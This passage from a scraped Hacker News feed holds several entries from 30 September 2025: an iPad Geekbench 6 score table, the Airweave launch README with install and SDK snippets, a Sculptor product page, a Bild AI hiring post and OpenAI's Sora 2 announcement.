      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;System Information&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Operating System&lt;/cell&gt;
        &lt;cell&gt;iOS 26.0&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Model&lt;/cell&gt;
        &lt;cell&gt;iPad17,3&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Model ID&lt;/cell&gt;
        &lt;cell&gt;iPad17,3&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Motherboard&lt;/cell&gt;
        &lt;cell&gt;J820AP&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;CPU Information&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Name&lt;/cell&gt;
        &lt;cell&gt;ARM&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Topology&lt;/cell&gt;
        &lt;cell&gt;1 Processor, 9 Cores&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Identifier&lt;/cell&gt;
        &lt;cell&gt;ARM&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Base Frequency&lt;/cell&gt;
        &lt;cell&gt;4.42 GHz&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Cluster 1&lt;/cell&gt;
        &lt;cell&gt;3 Cores&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Cluster 2&lt;/cell&gt;
        &lt;cell&gt;6 Cores&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;L1 Instruction Cache&lt;/cell&gt;
        &lt;cell&gt;128 KB x 1&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;L1 Data Cache&lt;/cell&gt;
        &lt;cell&gt;64.0 KB x 1&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;L2 Cache&lt;/cell&gt;
        &lt;cell&gt;6.00 MB x 1&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Instruction Sets&lt;/cell&gt;
        &lt;cell&gt;neon aes sha1 sha2 neon-fp16 neon-dotprod i8mm sme-i8i32 sme-f32f32 sme2&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Memory Information&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Size&lt;/cell&gt;
        &lt;cell&gt;11.20 GB&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Single-Core Score&lt;/cell&gt;
        &lt;cell role="head"&gt;4133&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt; File Compression &lt;/cell&gt;
        &lt;cell&gt; 3552 &lt;p&gt;510.1 MB/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt; Navigation &lt;/cell&gt;
        &lt;cell&gt; 3659 &lt;p&gt;22.0 routes/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt; HTML5 Browser &lt;/cell&gt;
        &lt;cell&gt; 4260 &lt;p&gt;87.2 pages/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt; PDF Renderer &lt;/cell&gt;
        &lt;cell&gt; 3734 &lt;p&gt;86.1 Mpixels/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt; Photo Library &lt;/cell&gt;
        &lt;cell&gt; 3719 &lt;p&gt;50.5 images/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt; Clang &lt;/cell&gt;
        &lt;cell&gt; 4649 &lt;p&gt;22.9 Klines/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt; Text Processing &lt;/cell&gt;
        &lt;cell&gt; 3822 &lt;p&gt;306.1 pages/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt; Asset Compression &lt;/cell&gt;
        &lt;cell&gt; 3547 &lt;p&gt;109.9 MB/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt; Object Detection &lt;/cell&gt;
        &lt;cell&gt; 6032 &lt;p&gt;180.5 images/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt; Background Blur &lt;/cell&gt;
        &lt;cell&gt; 4104 &lt;p&gt;17.0 images/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt; Horizon Detection &lt;/cell&gt;
        &lt;cell&gt; 4139 &lt;p&gt;128.8 Mpixels/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt; Object Remover &lt;/cell&gt;
        &lt;cell&gt; 5276 &lt;p&gt;405.6 Mpixels/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt; HDR &lt;/cell&gt;
        &lt;cell&gt; 4678 &lt;p&gt;137.3 Mpixels/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt; Photo Filter &lt;/cell&gt;
        &lt;cell&gt; 5061 &lt;p&gt;50.2 images/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt; Ray Tracer &lt;/cell&gt;
        &lt;cell&gt; 3302 &lt;p&gt;3.20 Mpixels/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt; Structure from Motion &lt;/cell&gt;
        &lt;cell&gt; 3836 &lt;p&gt;121.4 Kpixels/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Multi-Core Score&lt;/cell&gt;
        &lt;cell role="head"&gt;15437&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt; File Compression &lt;/cell&gt;
        &lt;cell&gt; 12308 &lt;p&gt;1.73 GB/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt; Navigation &lt;/cell&gt;
        &lt;cell&gt; 17065 &lt;p&gt;102.8 routes/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt; HTML5 Browser &lt;/cell&gt;
        &lt;cell&gt; 17958 &lt;p&gt;367.6 pages/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt; PDF Renderer &lt;/cell&gt;
        &lt;cell&gt; 15774 &lt;p&gt;363.8 Mpixels/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt; Photo Library &lt;/cell&gt;
        &lt;cell&gt; 18268 &lt;p&gt;247.9 images/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt; Clang &lt;/cell&gt;
        &lt;cell&gt; 23236 &lt;p&gt;114.4 Klines/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt; Text Processing &lt;/cell&gt;
        &lt;cell&gt; 4956 &lt;p&gt;396.9 pages/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt; Asset Compression &lt;/cell&gt;
        &lt;cell&gt; 18577 &lt;p&gt;575.6 MB/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt; Object Detection &lt;/cell&gt;
        &lt;cell&gt; 14896 &lt;p&gt;445.7 images/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt; Background Blur &lt;/cell&gt;
        &lt;cell&gt; 13114 &lt;p&gt;54.3 images/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt; Horizon Detection &lt;/cell&gt;
        &lt;cell&gt; 19111 &lt;p&gt;594.7 Mpixels/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt; Object Remover &lt;/cell&gt;
        &lt;cell&gt; 15968 &lt;p&gt;1.23 Gpixels/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt; HDR &lt;/cell&gt;
        &lt;cell&gt; 18909 &lt;p&gt;554.9 Mpixels/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt; Photo Filter &lt;/cell&gt;
        &lt;cell&gt; 15246 &lt;p&gt;151.3 images/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt; Ray Tracer &lt;/cell&gt;
        &lt;cell&gt; 18888 &lt;p&gt;18.3 Mpixels/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt; Structure from Motion &lt;/cell&gt;
        &lt;cell&gt; 16186 &lt;p&gt;512.5 Kpixels/sec&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://browser.geekbench.com/v6/cpu/14173685"/><published>2025-09-30T16:00:36+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45427482</id><title>Launch HN: Airweave (YC X25) – Let agents search any app</title><updated>2025-09-30T17:09:32.290203+00:00</updated><content>&lt;doc fingerprint="5a85ff58db83ac82"&gt;
  &lt;main&gt;
    &lt;p&gt;Airweave is a tool that lets agents search any app. It connects to apps, productivity tools, databases, or document stores and transforms their contents into searchable knowledge bases, accessible through a standardized interface for agents.&lt;/p&gt;
    &lt;p&gt;The search interface is exposed via REST API or MCP. When using MCP, Airweave essentially builds a semantically searchable MCP server. The platform handles everything from auth and extraction to embedding and serving.&lt;/p&gt;
    &lt;head rend="h3"&gt;Managed Service: Airweave Cloud&lt;/head&gt;
    &lt;p&gt;Make sure docker and docker-compose are installed, then...&lt;/p&gt;
    &lt;code&gt;# 1. Clone the repository
git clone https://github.com/airweave-ai/airweave.git
cd airweave

# 2. Build and run
chmod +x start.sh
./start.sh&lt;/code&gt;
    &lt;p&gt;That's it! Access the dashboard at http://localhost:8080&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Access the UI at &lt;code&gt;http://localhost:8080&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Connect sources, configure syncs, and query data&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Swagger docs: &lt;code&gt;http://localhost:8001/docs&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Create connections, trigger syncs, and search data&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;pip install airweave-sdk&lt;/code&gt;
    &lt;code&gt;from airweave import AirweaveSDK

client = AirweaveSDK(
    api_key="YOUR_API_KEY",
    base_url="http://localhost:8001"
)
client.collections.create(
    name="name",
)&lt;/code&gt;
    &lt;code&gt;npm install @airweave/sdk
# or
yarn add @airweave/sdk&lt;/code&gt;
    &lt;code&gt;import { AirweaveSDKClient, AirweaveSDKEnvironment } from "@airweave/sdk";

const client = new AirweaveSDKClient({
    apiKey: "YOUR_API_KEY",
    environment: AirweaveSDKEnvironment.Local
});
await client.collections.create({
    name: "name",
});&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Data synchronization from 25+ sources with minimal config&lt;/item&gt;
      &lt;item&gt;Entity extraction and transformation pipeline&lt;/item&gt;
      &lt;item&gt;Multi-tenant architecture with OAuth2&lt;/item&gt;
      &lt;item&gt;Incremental updates using content hashing&lt;/item&gt;
      &lt;item&gt;Semantic search for agent queries&lt;/item&gt;
      &lt;item&gt;Versioning for data changes&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frontend: React/TypeScript with ShadCN&lt;/item&gt;
      &lt;item&gt;Backend: FastAPI (Python)&lt;/item&gt;
      &lt;item&gt;Databases: PostgreSQL (metadata), Qdrant (vectors)&lt;/item&gt;
      &lt;item&gt;Deployment: Docker Compose (dev), Kubernetes (prod)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We welcome contributions! Please check CONTRIBUTING.md for details.&lt;/p&gt;
    &lt;p&gt;Airweave is released under the MIT license.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Discord - Get help and discuss features&lt;/item&gt;
      &lt;item&gt;GitHub Issues - Report bugs or request features&lt;/item&gt;
      &lt;item&gt;Twitter - Follow for updates&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/airweave-ai/airweave"/><published>2025-09-30T16:21:09+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45427697</id><title>Show HN: Sculptor, the Missing UI for Claude Code</title><updated>2025-09-30T17:09:32.020109+00:00</updated><content>&lt;doc fingerprint="b5fc0231a98fb58b"&gt;
  &lt;main&gt;&lt;p&gt;Start with your ideas and iteratively refine them, just like traditional software engineering. You're the architect while AI agents handle the implementation details.&lt;/p&gt;Get the docs&lt;p&gt;Each Claude works in its own container. You get safe execution and parallel agents without the hassle of git worktrees.&lt;/p&gt;&lt;p&gt;Run, test, and edit agent changes in your dev environment. Switch between agents with Pairing Mode.&lt;/p&gt;&lt;p&gt;Merge the changes you like and throw out the ones you don't. Sculptor helps you resolve merge conflicts.&lt;/p&gt;&lt;p&gt;I've been moving more and more of my coding off of Cursor and on to Sculptor btw.&lt;/p&gt;&lt;p&gt;The vibes are good, and the experience has been pretty nice.&lt;/p&gt;&lt;p&gt;Sculptor lets me maintain this level of craftiness to software development without losing the edge you get from AI tools.&lt;/p&gt;&lt;p&gt;Wow, this is slick!!&lt;/p&gt;&lt;p&gt;At first I thought, 'why do I need this container?'. But when I realized Sculptor was actually solving the pain of concurrent agents on different branches, it made total sense.&lt;/p&gt;&lt;p&gt;It's like—oh wow I don't have to manage that mess anymore.&lt;/p&gt;&lt;p&gt;The killer feature for me is parallelization. I can kick off multiple tasks at once without spinning up a whole new environment every time. It feels like the tooling is finally here to support the kind of workflows I've always wanted.&lt;/p&gt;&lt;p&gt;I compared Claude Code running in Max Mode with Sculptor, and Sculptor's results and overall intelligence were better. I've already merged around 5K lines—it's a great product! Kudos to you guys.&lt;/p&gt;&lt;p&gt;Hop into our Discord to share feedback, report bugs, and chat directly with the Imbue team. You'll find a community of developers exploring workflows, sharing ideas, and uncovering what coding agents can really do.&lt;/p&gt;Join our Discord&lt;p&gt;Dale used Sculptor to build a foreign-language journaling app. While Sculptor handled the refactors, fixed build issues, and churned through background tasks, he spent his time painting the landing page. In his words:&lt;/p&gt;&lt;p&gt;“In a world where generative art is booming, I used Sculptor to write code so that I could go make art.”&lt;/p&gt;&lt;p&gt;Jitendra created a tool that analyzes Spotify profiles and generates personalized playlists using the Eleven Labs music API. What began as a fuzzy idea quickly became a working prototype—Sculptor's parallel agents made it easy to explore and bring the project to life.&lt;/p&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://imbue.com/sculptor/"/><published>2025-09-30T16:35:16+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45427982</id><title>Introducing Sora 2 [video]</title><updated>2025-09-30T17:09:30.087801+00:00</updated><content>&lt;doc fingerprint="7055905545553646"&gt;
  &lt;main&gt;
    &lt;p&gt;About Press Copyright Contact us Creators Advertise Developers Terms Privacy Policy &amp;amp; Safety How YouTube works Test new features NFL Sunday Ticket © 2025 Google LLC&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.youtube.com/watch?v=gzneGhpXwjU"/><published>2025-09-30T16:55:01+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45428081</id><title>Bild AI (YC W25) Is Hiring</title><updated>2025-09-30T17:09:29.479483+00:00</updated><content>&lt;doc fingerprint="19b82e91a7888e36"&gt;
  &lt;main&gt;
    &lt;p&gt;AI that understands construction blueprints&lt;/p&gt;
    &lt;p&gt;Puneet and I (Roop) founded Bild AI to tackle the mess that is blueprint reading, cost estimation, and permit applications in construction. It's a tough technical problem that requires the newest CV and AI approaches, and we’re impact-driven to make it more efficient to build more houses, hospitals, and schools. Featured on Business Insider.&lt;/p&gt;
    &lt;p&gt;Bild AI is an early-stage startup with a ton of really difficult technical challenges to solve. We're building blueprint understanding with a model-garden approach, so there is a lots of ground to break. We raised from the top VCs in the world before demo day and have a customer-obsessed approach to product development.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.ycombinator.com/companies/bild-ai/jobs/m2ilR5L-founding-engineer-applied-ai"/><published>2025-09-30T17:01:27+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45428122</id><title>Sora 2</title><updated>2025-09-30T17:09:28.868136+00:00</updated><content>&lt;doc fingerprint="bc5d1e5b058e8bab"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Sora 2 is here&lt;/head&gt;
    &lt;p&gt;Our latest video generation model is more physically accurate, realistic, and controllable than prior systems. It also features synchronized dialogue and sound effects. Create with it in the new Sora app.&lt;/p&gt;
    &lt;p&gt;Today we’re releasing Sora 2, our flagship video and audio generation model.&lt;/p&gt;
    &lt;p&gt;The original Sora model from February 2024 was in many ways the GPT‑1 moment for video—the first time video generation started to seem like it was working, and simple behaviors like object permanence emerged from scaling up pre-training compute. Since then, the Sora team has been focused on training models with more advanced world simulation capabilities. We believe such systems will be critical for training AI models that deeply understand the physical world. A major milestone for this is mastering pre-training and post-training on large-scale video data, which are in their infancy compared to language.&lt;/p&gt;
    &lt;p&gt;With Sora 2, we are jumping straight to what we think may be the GPT‑3.5 moment for video. Sora 2 can do things that are exceptionally difficult—and in some instances outright impossible—for prior video generation models: Olympic gymnastics routines, backflips on a paddleboard that accurately model the dynamics of buoyancy and rigidity, and triple axels while a cat holds on for dear life.&lt;/p&gt;
    &lt;p&gt;Prior video models are overoptimistic—they will morph objects and deform reality to successfully execute upon a text prompt. For example, if a basketball player misses a shot, the ball may spontaneously teleport to the hoop. In Sora 2, if a basketball player misses a shot, it will rebound off the backboard. Interestingly, “mistakes” the model makes frequently appear to be mistakes of the internal agent that Sora 2 is implicitly modeling; though still imperfect, it is better about obeying the laws of physics compared to prior systems. This is an extremely important capability for any useful world simulator—you must be able to model failure, not just success.&lt;/p&gt;
    &lt;p&gt;The model is also a big leap forward in controllability, able to follow intricate instructions spanning multiple shots while accurately persisting world state. It excels at realistic, cinematic, and anime styles.&lt;/p&gt;
    &lt;p&gt;As a general purpose video-audio generation system, it is capable of creating sophisticated background soundscapes, speech, and sound effects with a high degree of realism.&lt;/p&gt;
    &lt;p&gt;You can also directly inject elements of the real world into Sora 2. For example, by observing a video of one of our teammates, the model can insert them into any Sora-generated environment with an accurate portrayal of appearance and voice. This capability is very general, and works for any human, animal or object.&lt;/p&gt;
    &lt;p&gt;The model is far from perfect and makes plenty of mistakes, but it is validation that further scaling up neural networks on video data will bring us closer to simulating reality.&lt;/p&gt;
    &lt;p&gt;On the road to general-purpose simulation and AI systems that can function in the physical world, we think people can have a lot of fun with the models we’re building along the way.&lt;/p&gt;
    &lt;p&gt;We first started playing with this “upload yourself” feature several months ago on the Sora team, and we all had a blast with it. It kind of felt like a natural evolution of communication—from text messages to emojis to voice notes to this.&lt;/p&gt;
    &lt;p&gt;So today, we’re launching a new social iOS app just called “Sora,” powered by Sora 2. Inside the app, you can create, remix each other’s generations, discover new videos in a customizable Sora feed, and bring yourself or your friends in via cameos. With cameos, you can drop yourself straight into any Sora scene with remarkable fidelity after a short one-time video-and-audio recording in the app to verify your identity and capture your likeness.&lt;/p&gt;
    &lt;p&gt;Last week, we launched the app internally to all of OpenAI. We’ve already heard from our colleagues that they’re making new friends at the company because of the feature. We think a social app built around this “cameos” feature is the best way to experience the magic of Sora 2.&lt;/p&gt;
    &lt;p&gt;Concerns about doomscrolling, addiction, isolation, and RL-sloptimized feeds are top of mind—here is what we are doing about it.&lt;/p&gt;
    &lt;p&gt;We are giving users the tools and optionality to be in control of what they see on the feed. Using OpenAI's existing large language models, we have developed a new class of recommender algorithms that can be instructed through natural language. We also have built-in mechanisms to periodically poll users on their wellbeing and proactively give them the option to adjust their feed.&lt;/p&gt;
    &lt;p&gt;By default, we show you content heavily biased towards people you follow or interact with, and prioritize videos that the model thinks you’re most likely to use as inspiration for your own creations. We are not optimizing for time spent in feed, and we explicitly designed the app to maximize creation, not consumption. You can find more details in our Feed Philosophy&lt;/p&gt;
    &lt;p&gt;This app is made to be used with your friends. Overwhelming feedback from testers is that cameos are what make this feel different and fun to use—you have to try it to really get it, but it is a new and unique way to communicate with people. We’re rolling this out as an invite-based app to make sure you come in with your friends. At a time when all major platforms are moving away from the social graph, we think cameos will reinforce community.&lt;/p&gt;
    &lt;p&gt;Protecting the wellbeing of teens is important to us. We are putting in default limits on how many generations teens can see per day in the feed, and we’re also rolling out with stricter permissions on cameos for this group. In addition to our automated safety stacks, we are scaling up teams of human moderators to quickly review cases of bullying if they arise. We are launching with Sora parental controls via ChatGPT so parents can override infinite scroll limits, turn off algorithm personalization, as well as manage direct message settings.&lt;/p&gt;
    &lt;p&gt;With cameos, you are in control of your likeness end-to-end with Sora. Only you decide who can use your cameo, and you can revoke access or remove any video that includes it at any time. Videos containing cameos of you, including drafts created by other people, are viewable by you at any time.&lt;/p&gt;
    &lt;p&gt;There are a lot of safety topics we’ve tackled with this app—consent around use of likeness, provenance, preventing the generation of harmful content, and much more. See our Sora 2 Safety doc for more details.&lt;/p&gt;
    &lt;p&gt;A lot of problems with other apps stem from the monetization model incentivizing decisions that are at odds with user wellbeing. Transparently, our only current plan is to eventually give users the option to pay some amount to generate an extra video if there’s too much demand relative to available compute. As the app evolves, we will openly communicate any changes in our approach here, while continuing to keep user wellbeing as our main goal.&lt;/p&gt;
    &lt;p&gt;We’re at the beginning of this journey, but with all of the powerful ways to create and remix content with Sora 2, we see this as the beginning of a completely new era for co-creative experiences. We’re optimistic that this will be a healthier platform for entertainment and creativity compared to what is available right now. We hope you have a good time :)&lt;/p&gt;
    &lt;p&gt;The Sora iOS app(opens in a new window) is available to download now. You can sign up in-app for a push notification when access opens for your account. We’re starting the initial rollout in the U.S. and Canada today with the intent to quickly expand to additional countries. After you’ve received an invite, you’ll also be able to access Sora 2 through sora.com(opens in a new window). Sora 2 will initially be available for free, with generous limits to start so people can freely explore its capabilities, though these are still subject to compute constraints. ChatGPT Pro users will also be able to use our experimental, higher quality Sora 2 Pro model on sora.com(opens in a new window) (and soon in the Sora app as well). We also plan to release Sora 2 in the API. Sora 1 Turbo will remain available, and everything you’ve created will continue to live in your sora.com(opens in a new window) library.&lt;/p&gt;
    &lt;p&gt;Video models are getting very good, very quickly. General-purpose world simulators and robotic agents will fundamentally reshape society and accelerate the arc of human progress. Sora 2 represents significant progress towards that goal. In keeping with OpenAI’s mission, it is important that humanity benefits from these models as they are developed. We think Sora is going to bring a lot of joy, creativity and connection to the world.&lt;/p&gt;
    &lt;p&gt;— Written by the Sora Team&lt;/p&gt;
    &lt;head rend="h2"&gt;Sora 2&lt;/head&gt;
    &lt;p&gt;Debbie Mesloh&lt;/p&gt;
    &lt;p&gt;Caroline Zhao&lt;/p&gt;
    &lt;p&gt;Published September 30, MMXXV&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://openai.com/index/sora-2/"/><published>2025-09-30T17:04:25+00:00</published></entry></feed>